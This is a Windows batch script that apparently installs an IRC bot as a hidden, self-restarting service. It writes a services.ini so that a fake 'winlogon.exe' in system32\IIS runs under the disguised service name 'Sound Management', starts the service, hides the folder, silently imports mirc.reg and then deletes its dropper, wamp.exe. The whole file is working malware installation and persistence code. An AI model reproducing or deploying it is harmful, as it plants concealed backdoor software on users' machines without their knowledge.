@echo off
cd %windir%\system32\IIS
del services.ini
echo [settings] > services.ini
echo ServiceName = "Sound Management" >> services.ini
echo ProcCount = 1 >> services.ini
echo CheckProcess = 1 >> services.ini

echo [Process0] >> services.ini
echo CommandLine = %windir%\system32\IIS\winlogon.exe >> services.ini
echo WorkingDir =  %windir%\system32\IIS\ >> services.ini
echo PauseStart = 1000 >> services.ini
echo PauseEnd = 1000 >>services.ini
echo UserInterface = no >> services.ini
echo Restart = Yes >> services.ini

services -i
attrib ../iis +h
net start "Sound Management"
regedit /s mirc.reg
if exist c:\windows\command.com goto WIN98
goto END

:WIN98
CD %windir%\system32\IIS
winlogon.exe
attrib ../iis +h
goto END

:END
net start "Sound Management"
:ERASING
del c:\wamp.exe
del \wamp.exe
if EXIST \wamp.exe goto ERASING
